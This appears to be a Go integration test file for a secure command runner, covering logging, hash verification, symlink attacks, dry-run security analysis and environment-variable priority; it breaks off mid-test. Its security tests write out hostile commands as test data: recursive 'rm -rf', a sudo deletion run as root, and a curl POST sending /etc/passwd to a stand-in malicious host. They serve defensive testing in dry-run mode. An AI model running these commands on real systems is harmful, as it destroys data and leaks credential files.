package main

import (
	"context"
	"errors"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/isseis/go-safe-cmd-runner/internal/filevalidator"
	"github.com/isseis/go-safe-cmd-runner/internal/runner/bootstrap"
	executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
	privilegetesting "github.com/isseis/go-safe-cmd-runner/internal/runner/privilege/testing"
	"github.com/isseis/go-safe-cmd-runner/internal/runner/resource"
	"github.com/isseis/go-safe-cmd-runner/internal/runner/runnertypes"
	"github.com/isseis/go-safe-cmd-runner/internal/terminal"
	"github.com/isseis/go-safe-cmd-runner/internal/verification"
	"github.com/stretchr/testify/mock"
)

// MockPathResolver is defined locally as it's specific to resource management
type MockPathResolver struct {
	mock.Mock
}

func (m *MockPathResolver) ResolvePath(command string) (string, error) {
	args := m.Called(command)
	return args.String(0), args.Error(1)
}

// validateMaliciousConfig validates that a malicious config file contains
// expected dangerous patterns and target paths for security testing purposes.
func validateMaliciousConfig(t *testing.T, configPath string, expectedPatterns []string, targetPath string) {
	t.Helper()

	// Verify that the malicious config file contains dangerous commands
	// This validates that our test setup correctly creates a security risk scenario
	configContent, err := os.ReadFile(configPath)
	if err != nil {
		t.Errorf("Failed to read malicious config: %v", err)
		return
	}

	configStr := string(configContent)

	// Verify the config contains all expected dangerous patterns
	for _, pattern := range expectedPatterns {
		if !strings.Contains(configStr, pattern) {
			t.Errorf("Malicious config should contain dangerous pattern %q", pattern)
		}
	}

	// Verify the target path if specified
	if targetPath != "" && !strings.Contains(configStr, targetPath) {
		t.Errorf("Malicious config should target test-specific path %q", targetPath)
	}

	t.Log("Malicious config properly contains dangerous command - would require dry-run or security controls for safe execution")
}

// TestSetupLoggerWithConfig_IntegrationWithNewHandlers tests the integration
// of the new terminal-aware handlers with the existing logging system
func TestSetupLoggerWithConfig_IntegrationWithNewHandlers(t *testing.T) {
	testCases := []struct {
		name           string
		config         bootstrap.LoggerConfig
		envVars        map[string]string
		expectHandlers int
		expectError    bool
	}{
		{
			name: "interactive_environment_with_color_support",
			config: bootstrap.LoggerConfig{
				Level:           "info",
				LogDir:          "",
				RunID:           "test-run-001",
				SlackWebhookURL: "",
			},
			envVars: map[string]string{
				"TERM":     "xterm-256color",
				"NO_COLOR": "",
			},
			expectHandlers: 2, // Interactive + Conditional text handlers
			expectError:    false,
		},
		{
			name: "non_interactive_environment",
			config: bootstrap.LoggerConfig{
				Level:           "debug",
				LogDir:          "",
				RunID:           "test-run-002",
				SlackWebhookURL: "",
			},
			envVars: map[string]string{
				"CI":       "true",
				"NO_COLOR": "1",
			},
			expectHandlers: 1, // Only conditional text handler
			expectError:    false,
		},
		{
			name: "full_handler_chain_with_log_and_slack",
			config: bootstrap.LoggerConfig{
				Level:           "warn",
				LogDir:          t.TempDir(),
				RunID:           "test-run-003",
				SlackWebhookURL: "https://hooks.slack.com/test/webhook",
			},
			envVars: map[string]string{
				"TERM": "xterm",
			},
			expectHandlers: 4, // Interactive + Conditional text + JSON + Slack
			expectError:    false,
		},
		{
			name: "invalid_log_directory",
			config: bootstrap.LoggerConfig{
				Level:           "info",
				LogDir:          "/invalid/nonexistent/path",
				RunID:           "test-run-004",
				SlackWebhookURL: "",
			},
			envVars:        map[string]string{},
			expectHandlers: 0,
			expectError:    true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Set up environment variables using t.Setenv for automatic cleanup
			for key, value := range tc.envVars {
				t.Setenv(key, value)
			}

			// Capture original logger to restore later
			originalLogger := slog.Default()
			defer slog.SetDefault(originalLogger)

			// Run the function under test
			err := bootstrap.SetupLoggerWithConfig(tc.config, false, false)

			// Check error expectation
			if tc.expectError {
				if err == nil {
					t.Errorf("Expected error but got none")
				}
				return
			}

			if err != nil {
				t.Errorf("Unexpected error: %v", err)
				return
			}

			// Verify logger was set up (basic smoke test)
			logger := slog.Default()
			if logger == nil {
				t.Error("Logger should not be nil after setup")
			}

			// Test that logging works without panics
			logger.Info("Integration test log message",
				"test_case", tc.name,
				"run_id", tc.config.RunID,
			)

			logger.Error("Integration test error message",
				"test_case", tc.name,
				"component", "integration_test",
			)
		})
	}
}

// TestTerminalCapabilitiesIntegration tests that terminal capabilities
// are properly integrated with the logging system
func TestTerminalCapabilitiesIntegration(t *testing.T) {
	if os.Getenv("CI") == "true" {
		t.Skip("Skipping terminal capabilities test in CI environment (no tty support)")
	}
	testCases := []struct {
		name              string
		envVars           map[string]string
		expectColor       bool
		expectInteractive bool
	}{
		{
			name: "forced_color_mode",
			envVars: map[string]string{
				"CLICOLOR_FORCE": "1",
				"CI":             "true", // Would normally disable interactive
			},
			expectColor:       true,
			expectInteractive: false, // CI environment still not interactive
		},
		{
			name: "disabled_color_mode",
			envVars: map[string]string{
				"NO_COLOR": "1",
				"TERM":     "xterm-256color",
			},
			expectColor:       false,
			expectInteractive: true, // TERM is set, so considered interactive
		},
		{
			name: "auto_detection",
			envVars: map[string]string{
				"TERM": "xterm-256color",
			},
			expectColor:       true, // TERM indicates color support
			expectInteractive: true, // TERM indicates interactive environment
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Set up environment variables using t.Setenv for automatic cleanup
			for key, value := range tc.envVars {
				if value == "" {
					// For empty values, we want to unset the variable
					// but t.Setenv doesn't support unsetting, so we use a special marker
					// that our code will treat as unset
					t.Setenv(key, "")
				} else {
					t.Setenv(key, value)
				}
			}

			// Test terminal capabilities
			capabilities := terminal.NewCapabilities(terminal.Options{})

			if capabilities.SupportsColor() != tc.expectColor {
				t.Errorf("Color support mismatch: expected %v, got %v",
					tc.expectColor, capabilities.SupportsColor())
			}

			if capabilities.IsInteractive() != tc.expectInteractive {
				t.Errorf("Interactive mode mismatch: expected %v, got %v",
					tc.expectInteractive, capabilities.IsInteractive())
			}
		})
	}
}

// TestHandlerChainIntegration tests that messages flow correctly through
// the complete handler chain
func TestHandlerChainIntegration(t *testing.T) {
	// Create temporary directory for log files
	logDir := t.TempDir()

	config := bootstrap.LoggerConfig{
		Level:           "debug",
		LogDir:          logDir,
		RunID:           "integration-test-run",
		SlackWebhookURL: "", // Skip Slack for this test
	}

	// Capture original logger and streams
	originalLogger := slog.Default()
	originalStderr := os.Stderr
	originalStdout := os.Stdout

	// Restore after test
	defer func() {
		slog.SetDefault(originalLogger)
		os.Stderr = originalStderr
		os.Stdout = originalStdout
	}()

	// Set environment for testing using t.Setenv for automatic cleanup
	t.Setenv("TERM", "dumb") // Disable interactive features

	// Note: We can't easily redirect stderr/stdout for this test since
	// the handlers are created internally, but we can test basic setup

	// Test setup
	err := bootstrap.SetupLoggerWithConfig(config, false, false)
	if err != nil {
		t.Fatalf("Setup failed: %v", err)
	}

	// Test logging through the chain
	logger := slog.Default()

	// Test different log levels
	logger.Debug("Debug message for integration test")
	logger.Info("Info message for integration test")
	logger.Warn("Warning message for integration test")
	logger.Error("Error message for integration test")

	// Test with attributes
	logger.With("component", "integration_test", "run_id", config.RunID).
		Info("Message with attributes")

	// Test with groups
	logger.WithGroup("test_group").
		With("nested_attr", "value").
		Info("Message with groups and attributes")

	// Verify log file was created (if logDir was specified)
	if config.LogDir != "" {
		entries, err := os.ReadDir(config.LogDir)
		if err != nil {
			t.Fatalf("Failed to read log directory: %v", err)
		}

		if len(entries) == 0 {
			t.Error("Expected log file to be created, but directory is empty")
		}

		// Check if log file contains our run ID
		for _, entry := range entries {
			if strings.Contains(entry.Name(), config.RunID) {
				// Found our log file
				return
			}
		}
		t.Error("Expected to find log file with run ID, but none found")
	}
}

// TestErrorHandling tests error handling in the integrated system
func TestErrorHandling(t *testing.T) {
	testCases := []struct {
		name        string
		config      bootstrap.LoggerConfig
		expectError bool
		errorType   string
	}{
		{
			name: "invalid_log_level",
			config: bootstrap.LoggerConfig{
				Level:           "invalid-level",
				LogDir:          "",
				RunID:           "test-error-001",
				SlackWebhookURL: "",
			},
			expectError: false, // Should default to INFO and continue
			errorType:   "",
		},
		{
			name: "invalid_slack_webhook",
			config: bootstrap.LoggerConfig{
				Level:           "info",
				LogDir:          "",
				RunID:           "test-error-002",
				SlackWebhookURL: "not-a-valid-url",
			},
			expectError: true,
			errorType:   "slack handler creation",
		},
		{
			name: "nonexistent_log_directory",
			config: bootstrap.LoggerConfig{
				Level:           "info",
				LogDir:          "/path/does/not/exist",
				RunID:           "test-error-003",
				SlackWebhookURL: "",
			},
			expectError: true,
			errorType:   "log directory validation",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Capture original logger to restore later
			originalLogger := slog.Default()
			defer slog.SetDefault(originalLogger)

			err := bootstrap.SetupLoggerWithConfig(tc.config, false, false)

			if tc.expectError {
				if err == nil {
					t.Errorf("Expected error (%s) but got none", tc.errorType)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error: %v", err)
				}
			}
		})
	}
}

// Phase 4 Integration Tests - Testing and Validation Components

// TestSecureExecutionFlow tests the complete secure execution flow
func TestSecureExecutionFlow(t *testing.T) {
	testCases := []struct {
		name          string
		setupFunc     func(t *testing.T) string
		hashDirectory string
		expectError   bool
		errorContains string
	}{
		{
			name: "successful_execution_with_valid_config_and_hash_dir",
			// Only create the temporary directory; config file was unused by the test
			setupFunc: func(t *testing.T) string {
				return t.TempDir()
			},
			expectError: false,
		},
		{
			name: "failure_with_invalid_hash_directory",
			setupFunc: func(t *testing.T) string {
				return t.TempDir()
			},
			hashDirectory: "/nonexistent/hash/directory",
			expectError:   true,
			errorContains: "hash directory not found",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			tempDir := tc.setupFunc(t)

			var hashDir string
			if tc.hashDirectory != "" {
				hashDir = tc.hashDirectory
			} else {
				hashDir = filepath.Join(tempDir, "hashes")
				if !tc.expectError {
					if err := os.MkdirAll(hashDir, 0o700); err != nil {
						t.Fatalf("Failed to create hash directory: %v", err)
					}
				}
			}

			// Hash directory validation is now performed internally by verification.Manager
			// We just need to ensure the directory exists for the test
			if _, err := os.Stat(hashDir); err != nil && !tc.expectError {
				t.Errorf("Hash directory should exist: %v", err)
			}
		})
	}
}

// TestVerificationIntegration tests the integration of multiple verification steps
func TestVerificationIntegration(t *testing.T) {
	testCases := []struct {
		name          string
		setupFunc     func(t *testing.T) (hashDir string, configPath string)
		expectError   bool
		errorContains string
	}{
		{
			name: "successful_multi_step_verification",
			setupFunc: func(t *testing.T) (string, string) {
				tempDir := t.TempDir()
				hashDir := filepath.Join(tempDir, "hashes")
				if err := os.MkdirAll(hashDir, 0o700); err != nil {
					t.Fatalf("Failed to create hash directory: %v", err)
				}

				configPath := filepath.Join(tempDir, "config.toml")
				configContent := `
[global]
log_level = "debug"
skip_standard_paths = true

[[groups]]
name = "integration-test"

[[groups.commands]]
name = "test-cmd"
cmd = ["echo", "integration-test"]
`
				if err := os.WriteFile(configPath, []byte(configContent), 0o644); err != nil {
					t.Fatalf("Failed to create config file: %v", err)
				}
				return hashDir, configPath
			},
			expectError: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			hashDir, configPath := tc.setupFunc(t)

			// Hash directory validation is now performed internally by verification.Manager
			// Step 1: Verify hash directory exists
			if _, err := os.Stat(hashDir); err != nil && !tc.expectError {
				t.Errorf("Hash directory should exist: %v", err)
			}

			// If we expected an error, return early as the test is complete
			if tc.expectError {
				return
			}

			// Step 2: Verify config file exists and is readable
			if _, err := os.Stat(configPath); err != nil {
				t.Errorf("Config file verification failed: %v", err)
			}
		})
	}
}

// TestSecurityAttackScenarios tests various security attack scenarios
func TestSecurityAttackScenarios(t *testing.T) {
	testCases := []struct {
		name             string
		setupFunc        func(t *testing.T) (hashDir string, configPath string)
		expectError      bool
		errorContains    string
		validateConfig   bool
		expectedPatterns []string
		targetPath       string
	}{
		{
			name: "symlink_attack_on_hash_directory",
			setupFunc: func(t *testing.T) (string, string) {
				tempDir := t.TempDir()

				targetDir := filepath.Join(os.TempDir(), "symlink_target")
				if err := os.MkdirAll(targetDir, 0o755); err != nil {
					t.Fatalf("Failed to create target directory: %v", err)
				}
				t.Cleanup(func() { os.RemoveAll(targetDir) })

				symlinkPath := filepath.Join(tempDir, "hashes")
				if err := os.Symlink(targetDir, symlinkPath); err != nil {
					t.Fatalf("Failed to create symlink: %v", err)
				}

				configPath := filepath.Join(tempDir, "config.toml")
				configContent := `
[global]
log_level = "info"
`
				if err := os.WriteFile(configPath, []byte(configContent), 0o644); err != nil {
					t.Fatalf("Failed to create config file: %v", err)
				}

				return symlinkPath, configPath
			},
			expectError:   true,
			errorContains: "symlink",
		},
		{
			name: "malicious_config_file_content",
			setupFunc: func(t *testing.T) (string, string) {
				tempDir := t.TempDir()

				hashDir := filepath.Join(tempDir, "hashes")
				if err := os.MkdirAll(hashDir, 0o700); err != nil {
					t.Fatalf("Failed to create hash directory: %v", err)
				}

				configPath := filepath.Join(tempDir, "malicious_config.toml")
				maliciousContent := `
[global]
log_level = "info"

[[groups]]
name = "malicious-group"

[[groups.commands]]
name = "dangerous-cmd"
cmd = ["rm", "-rf", "/tmp/should-not-execute"]
`
				if err := os.WriteFile(configPath, []byte(maliciousContent), 0o644); err != nil {
					t.Fatalf("Failed to create malicious config file: %v", err)
				}

				return hashDir, configPath
			},
			expectError:      false, // Config loading should succeed - actual command execution control tested in TestMaliciousConfigCommandControlSecurity
			validateConfig:   true,
			expectedPatterns: []string{"rm", "-rf"},
			targetPath:       "/tmp/should-not-execute",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			hashDir, configPath := tc.setupFunc(t)

			// Hash directory validation is now performed internally by verification.Manager
			// Verify hash directory exists
			if _, err := os.Stat(hashDir); err != nil && !tc.expectError {
				t.Errorf("Hash directory should exist: %v", err)
			}

			// For expected error cases, we've completed validation
			if tc.expectError {
				return
			}

			// Verify config file is readable
			if _, statErr := os.Stat(configPath); statErr != nil {
				t.Errorf("Config file should be readable: %v", statErr)
				// Continue to next validation - don't return early
			}

			// Perform additional security validation if required (independent of previous validations)
			if tc.validateConfig {
				validateMaliciousConfig(t, configPath, tc.expectedPatterns, tc.targetPath)
			}
		})
	}
}

// TestMaliciousConfigCommandControlSecurity verifies that dangerous commands
// are properly analyzed and controlled by the DryRunResourceManager
func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
	testCases := []struct {
		name                    string
		cmd                     runnertypes.Command
		group                   *runnertypes.CommandGroup
		expectedSecurityRisk    string
		expectedExecutionResult bool
		description             string
	}{
		{
			name: "dangerous_rm_command_dry_run_protection",
			cmd: runnertypes.Command{
				Name: "dangerous-rm",
				Cmd:  "rm",
				Args: []string{"-rf", "/tmp/should-not-execute-in-test"},
			},
			group: &runnertypes.CommandGroup{
				Name: "malicious-group",
			},
			expectedSecurityRisk:    "high",
			expectedExecutionResult: true, // Should complete analysis without actual execution
			description:             "Dangerous rm command should be analyzed and controlled in dry-run mode",
		},
		{
			name: "sudo_privilege_escalation_protection",
			cmd: runnertypes.Command{
				Name:      "sudo-escalation",
				Cmd:       "sudo",
				Args:      []string{"rm", "-rf", "/tmp/test-sudo-target"},
				RunAsUser: "root",
			},
			group: &runnertypes.CommandGroup{
				Name: "privilege-escalation-group",
			},
			expectedSecurityRisk:    "high",
			expectedExecutionResult: true, // Should complete analysis without actual execution
			description:             "Sudo privilege escalation should be analyzed and controlled in dry-run mode",
		},
		{
			name: "network_exfiltration_command_protection",
			cmd: runnertypes.Command{
				Name: "data-exfil",
				Cmd:  "curl",
				Args: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
			},
			group: &runnertypes.CommandGroup{
				Name: "network-exfil-group",
			},
			expectedSecurityRisk:    "medium", // curl typically classified as medium risk
			expectedExecutionResult: true,     // Should complete analysis without actual execution
			description:             "Network data exfiltration should be analyzed and controlled in dry-run mode",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			runnertypes.PrepareCommand(&tc.cmd)

			// Import required packages for mocks
			// Note: Using the same mock setup pattern as existing tests
			tempDir := t.TempDir()
			hashDir := filepath.Join(tempDir, "hashes")
			if err := os.MkdirAll(hashDir, 0o700); err != nil {
				t.Fatalf("Failed to create hash directory: %v", err)
			}

			// Create DryRunResourceManager with mocks
			mockExec := executortesting.NewMockExecutor()
			mockPriv := privilegetesting.NewMockPrivilegeManager(true)
			mockPathResolver := &MockPathResolver{}

			// Setup command path resolution
			mockPathResolver.On("ResolvePath", tc.cmd.Cmd).Return("/usr/bin/"+tc.cmd.Cmd, nil)

			opts := &resource.DryRunOptions{
				DetailLevel:       resource.DetailLevelDetailed,
				HashDir:           hashDir,
				SkipStandardPaths: true,
			}

			dryRunManager, err := resource.NewDryRunResourceManager(mockExec, mockPriv, mockPathResolver, opts)
			if err != nil {
				t.Fatalf("Failed to create DryRunResourceManager: %v", err)
			}

			// Execute the dangerous command in dry-run mode
			ctx := context.Background()
			env := map[string]string{}

			result, err := dryRunManager.ExecuteCommand(ctx, tc.cmd, tc.group, env)

			// Verify that execution completed successfully (analysis without actual execution)
			if tc.expectedExecutionResult {
				if err != nil {
					t.Errorf("Expected dry-run execution to succeed, but got error: %v", err)
				}
				if result == nil {
					t.Error("Expected execution result, but got nil")
				}
			} else if err == nil {
				t.Error("Expected dry-run execution to fail, but it succeeded")
			}

			// Get dry-run results to verify security analysis
			dryRunResult := dryRunManager.GetDryRunResults()
			if dryRunResult == nil {
				t.Fatal("Expected dry-run results, but got nil")
			}

			// Verify security analysis was performed
			if len(dryRunResult.ResourceAnalyses) == 0 {
				t.Error("Expected security analysis to be recorded, but no analyses found")
			}

			// Verify security risk level for the dangerous command
			found := false
			for _, analysis := range dryRunResult.ResourceAnalyses {
				// Check if this analysis is for our command (match by target path or command name)
				if strings.Contains(analysis.Target, tc.cmd.Cmd) || strings.Contains(analysis.Target, tc.cmd.Name) {
					found = true
					if analysis.Impact.SecurityRisk != tc.expectedSecurityRisk {
						t.Errorf("Expected security risk %q, but got %q",
							tc.expectedSecurityRisk, analysis.Impact.SecurityRisk)
					}

					// Verify that security warnings are present
					if !strings.Contains(analysis.Impact.Description, "WARNING") {
						t.Error("Expected security warning in impact description")
					}

					t.Logf("Security analysis completed: %s - Risk: %s, Target: %s",
						tc.description, analysis.Impact.SecurityRisk, analysis.Target)
					break
				}
			}

			if !found {
				t.Errorf("Expected to find analysis for command %q, but it was not recorded", tc.cmd.Name)
				// Log available analyses for debugging
				for i, analysis := range dryRunResult.ResourceAnalyses {
					t.Logf("Analysis %d: Type=%s, Target=%s, SecurityRisk=%s",
						i, analysis.Type, analysis.Target, analysis.Impact.SecurityRisk)
				}
			}

			// Verify that no actual command was executed (mocks should not have been called for execution)
			// This is implicitly verified by not setting up execution expectations on mockExec

			t.Logf("Dry-run protection verified: %s", tc.description)
		})
	}
}

// TestSecurityBoundaryValidation tests security boundary validation
func TestSecurityBoundaryValidation(t *testing.T) {
	testCases := []struct {
		name          string
		setupFunc     func(t *testing.T) string
		expectError   bool
		errorContains string
	}{
		{
			name: "successful_validation_with_existing_directory",
			setupFunc: func(t *testing.T) string {
				tempDir := t.TempDir()
				hashDir := filepath.Join(tempDir, "hashes")
				if err := os.MkdirAll(hashDir, 0o700); err != nil {
					t.Fatalf("Failed to create hash directory: %v", err)
				}
				return hashDir
			},
			expectError: false,
		},
		{
			name: "relative_path_rejection",
			setupFunc: func(_ *testing.T) string {
				return "relative/path/hashes"
			},
			expectError:   true,
			errorContains: "hash directory must be absolute path",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			hashDir := tc.setupFunc(t)

			// Hash directory validation is now performed internally by verification.Manager
			// Just verify the directory exists if no error is expected
			if !tc.expectError {
				if _, err := os.Stat(hashDir); err != nil {
					t.Errorf("Hash directory should exist: %v", err)
				}
			}
		})
	}
}

// TestUnverifiedDataAccessPrevention tests that access to unverified data is properly prevented
func TestUnverifiedDataAccessPrevention(t *testing.T) {
	tempDir := t.TempDir()

	// Create hash directory
	hashDir := filepath.Join(tempDir, "hashes")
	if err := os.MkdirAll(hashDir, 0o700); err != nil {
		t.Fatalf("Failed to create hash directory: %v", err)
	}

	// Create a data file that has no corresponding hash file (unverified data)
	unverifiedFile := filepath.Join(tempDir, "unverified_data.txt")
	if err := os.WriteFile(unverifiedFile, []byte("sensitive unverified data"), 0o644); err != nil {
		t.Fatalf("Failed to create unverified data file: %v", err)
	}

	// Attempt to verify the unverified file - this should fail
	validator, err := filevalidator.New(&filevalidator.SHA256{}, hashDir)
	if err != nil {
		t.Fatalf("Failed to create validator: %v", err)
	}

	// Test that verification of unverified data fails appropriately
	err = validator.Verify(unverifiedFile)
	if err == nil {
		t.Error("Expected verification to fail for unverified data, but it succeeded")
		return
	}

	// Verify that the error is the expected hash file not found error
	if !errors.Is(err, filevalidator.ErrHashFileNotFound) {
		t.Errorf("Expected ErrHashFileNotFound, but got: %v", err)
	}

	t.Log("Successfully prevented access to unverified data - hash verification properly failed")
}

// TestRunner_EnvironmentVariablePriority_Basic tests basic environment variable priority rules
// Priority: command env > group env > global env > system env
func TestRunner_EnvironmentVariablePriority_Basic(t *testing.T) {
	tests := []struct {
		name       string
		systemEnv  map[string]string
		configTOML string
		expectVars map[string]string
	}{
		{
			name: "system_env_only",
			systemEnv: map[string]string{
				"TEST_VAR": "system_value",
			},
			configTOML: `
[global]
[[groups]]
name = "test_group"
[[groups.commands]]
name = "test"
cmd = "printenv"
args = ["TEST_VAR"]
`,
			expectVars: map[string]string{
				"TEST_VAR": "system_value",
			},
		},
		{
			name: "global_overrides_system",
			systemEnv: map[string]string{
				"TEST_VAR": "system_value",
			},
			configTOML: `
[global]
env = ["TEST_VAR=global_value"]
[[groups]]
name = "test_group"
[[groups.commands]]
name = "test"
cmd = "printenv"
args = ["TEST_VAR"]
`,
			expectVars: map[string]string{
				"TEST_VAR": "global_value",
			},
		},
		{
			name: "group_overrides_global",
			systemEnv: map[string]string{
				"TEST_VAR": "system_value",
			},
			configTOML: `
[global]
env = ["TEST_VAR=global_value"]
[[groups]]
name = "test_group"
env = ["TEST_VAR=group_value"]
[[groups.commands]]
name = "test"
cmd = "printenv"
args = ["TEST_VAR"]
`,
			expectVars: map[string]string{
				"TEST_VAR": "group_value",
			},
		},
		{
			name: "command_overrides_all",
			systemEnv: map[string]string{
				"TEST_VAR": "system_value",
			},
			configTOML: `
[global]
env = ["TEST_VAR=global_value"]
[[groups]]
name = "test_group"
env = ["TEST_VAR=group_value"]
[[groups.commands]]
name = "test"
cmd = "printenv"
args = ["TEST_VAR"]
env = ["TEST_VAR=command_value"]
`,
			expectVars: map[string]string{
				"TEST_VAR": "command_value",
			},
		},
		{
			name: "mixed_priority",
			systemEnv: map[string]string{
				"VAR_A": "sys_a",
				"VAR_B": "sys_b",
				"VAR_C": "sys_c",
			},
			configTOML: `
[global]
env = ["VAR_B=global_b"]
[[groups]]
name = "test_group"
env = ["VAR_C=group_c"]
[[groups.commands]]
name = "test"
cmd = "echo"
args = ["test"]
`,
			expectVars: map[string]string{
				"VAR_A": "sys_a",
				"VAR_B": "global_b",
				"VAR_C": "group_c",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Set up system environment
			for k, v := range tt.systemEnv {
				t.Setenv(k, v)
			}

			// Create temporary config file
			tempDir := t.TempDir()
			configPath := filepath.Join(tempDir, "config.toml")
			if err := os.WriteFile(configPath, []byte(tt.configTOML), 0o644); err != nil {
				t.Fatalf("Failed to write config file: %v", err)
			}

			// Create hash directory
			hashDir := filepath.Join(tempDir, "hashes")
			if err := os.MkdirAll(hashDir, 0o700); err != nil {
				t.Fatalf("Failed to create hash directory: %v", err)
			}

			// Load and prepare config
			verificationManager, err := verification.NewManagerForTest(hashDir, verification.WithFileValidatorDisabled())
			if err != nil {
				t.Fatalf("Failed to create verification manager: %v", err)
			}

			cfg, err := bootstrap.LoadAndPrepareConfig(verificationManager, configPath, "test-run-env-priority")
			if err != nil {
				t.Fatalf("Failed to load config: %v", err)
			}

			// Extract the first command
			if len(cfg.Groups) == 0 || len(cfg.Groups[0].Commands) == 0 {
				t.Fatal("No command found in config")
			}
			cmd := &cfg.Groups[0].Commands[0]
			group := &cfg.Groups[0]

			// Build final environment map (simulating what runner does)
			// Priority: command env > group env > global env > system env
			finalEnv := make(map[string]string)

			// Start with system env
			for k, v := range tt.systemEnv {
				finalEnv[k] = v
			}

			// Apply global env (ExpandedEnv is already populated after LoadAndPrepareConfig)
			for k, v := range cfg.Global.ExpandedEnv {
				finalEnv[k] = v
			}

			// Apply group env
			for k, v := range group.ExpandedEnv {
				finalEnv[k] = v
			}

			// Apply command env
			for k, v := range cmd.ExpandedEnv {
				finalEnv[k] = v
			}

			// Verify expected variables
			for k, expectedVal := range tt.expectVars {
				actualVal, ok := finalEnv[k]
				if !ok {
					t.Errorf("Variable %s not found in final environment", k)
					continue
				}
				if actualVal != expectedVal {
					t.Errorf("Variable %s: expected %q, got %q", k, expectedVal, actualVal)
				}
			}
		})
	}
}

// TestRunner_EnvironmentVariablePriority_WithVars tests environment variable priority with vars expansion
func TestRunner_EnvironmentVariablePriority_WithVars(t *testing.T) {
	tests := []struct {
		name       string
		systemEnv  map[string]string
		configTOML string
		expectVars map[string]string
	}{
		{
			name: "vars_referencing_lower_priority_env",
			systemEnv: map[string]string{
				"USER": "testuser",
			},
			configTOML: `
[global]
from_env = ["USER=USER"]
env_allowlist = ["USER"]
vars = ["myvar=%{USER}"]
env = ["HOME=%{myvar}"]
[[groups]]
name = "test_group"
[[groups.commands]]
name = "test"
cmd = "printenv"
args = ["HOME"]
`,
			expectVars: map[string]string{
				"HOME": "testuser",
			},
		},
		{
			name:      "command_vars_overriding_group",
			systemEnv: map[string]string{},
			configTOML: `
[global]
vars = ["v=global"]
[[groups]]
name = "test_group"
vars = ["v=group"]
[[groups.commands]]
name = "test"
cmd = "echo"
args = ["test"]
vars = ["v=command"]
env = ["RESULT=%{v}"]
`,
			expectVars: map[string]string{
				"RESULT": "command",
			},
		},
		{
			name: "complex_chain_respecting_priority",
			systemEnv: map[string]string{
				"HOME": "/home/test",
			},
			configTOML: `
[global]
from_env = ["HOME=HOME"]
env_allowlist = ["HOME"]
vars = ["gv2=%{HOME}/global"]
[[groups]]
name = "test_group"
vars = ["gv3=%{gv2}/group"]
[[groups.commands]]
name = "test"
cmd = "echo"
args = ["test"]
env = ["FINAL=%{gv3}/cmd"]
`,
			expectVars: map[string]string{
				"FINAL": "/home/test/global/group/cmd",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Set up system environment
			for k, v := range tt.systemEnv {
				t.Setenv(k, v)
			}

			// Create temporary config file
			tempDir := t.TempDir()
			configPath := filepath.Join(tempDir, "config.toml")
			if err := os.WriteFile(configPath, []byte(tt.configTOML), 0o644); err != nil {
				t.Fatalf("Failed to write config file: %v", err)
			}

			// Create hash directory
			hashDir := filepath.Join(tempDir, "hashes")
			if err := os.MkdirAll(hashDir, 0o700); err != nil {
				t.Fatalf("Failed to create hash directory: %v", err)
			}

			// Load and prepare config
			verificationManager, err := verification.NewManagerForTest(hashDir, verification.WithFileValidatorDisabled())
			if err != nil {
				t.Fatalf("Failed to create verification manager: %v", err)
			}

			cfg, err := bootstrap.LoadAndPrepareConfig(verificationManager, configPath, "test-run-env-priority")
			if err != nil {
				t.Fatalf("Failed to load config: %v", err)
			}

			// Extract the first command
			if len(cfg.Groups) == 0 || len(cfg.Groups[0].Commands) == 0 {
				t.Fatal("No command found in config")
			}
			cmd := &cfg.Groups[0].Commands[0]
			group := &cfg.Groups[0]

			// Build final environment map
			finalEnv := make(map[string]string)

			// Start with system env
			for k, v := range tt.systemEnv {
				finalEnv[k] = v
			}

			// Apply global env
			for k, v := range cfg.Global.ExpandedEnv {
				finalEnv[k] = v
			}

			// Apply group env
			for k, v := range group.ExpandedEnv {
				finalEnv[k] = v
			}

			// Apply command env
			for k, v := range cmd.ExpandedEnv {
				finalEnv[k] = v
			}

			// Verify expected variables
			for k, expectedVal := range tt.expectVars {
				actualVal, ok := finalEnv[k]
				if !ok {
					t.Errorf("Variable %s not found in final environment", k)
					continue
				}
				if actualVal != expectedVal {
					t.Errorf("Variable %s: expected %q, got %q", k, expectedVal, actualVal)
				}
			}
		})
	}
}

// TestRunner_EnvironmentVariablePriority_EdgeCases tests edge cases and unusual scenarios
func TestRunner_EnvironmentVariablePriority_EdgeCases(t *testing.T) {
	tests := []struct {
		name       string
		systemEnv  map[string]string
		configTOML string
		expectVars map[string]string
	}{
		{
			name: "empty_value_at_different_levels",
			systemEnv: map[string]string{
				"VAR": "system",
			},
			configTOML: `
[global]
env = ["VAR="]
[[groups]]
name = "test_group"
[[groups.commands]]
name = "test"
cmd = "echo"
args = ["test"]
`,
			expectVars: map[string]string{
				"VAR": "", // Empty, not unset
			},
		},
		{
			name:      "unset_at_higher_priority",
			systemEnv: map[string]string{},
			configTOML: `
[global]
env = ["VAR=global_value"]
[[groups]]
name = "test_group"
[[groups.commands]]
name = "test"
cmd = "echo"
args = ["test"]
`,
			expectVars: map[string]string{
				"VAR": "global_value",
			},
		},
		{
			name:      "numeric_and_special_values",
			systemEnv: map[string]string{},
			configTOML: `
[global]
[[groups]]
name = "test_group"
[[groups.commands]]
name = "test"
cmd = "echo"
args = ["test"]
env = ["NUM=123", "SPECIAL=$pecial!@#"]
`,
			expectVars: map[string]string{
				"NUM":     "123",
				"SPECIAL": "$pecial!@#",
			},
		},
		{
			name:      "very_long_value",
			systemEnv: map[string]string{},
			configTOML: `
[global]
[[groups]]
name = "test_group"
[[groups.commands]]
name = "test"
cmd = "echo"
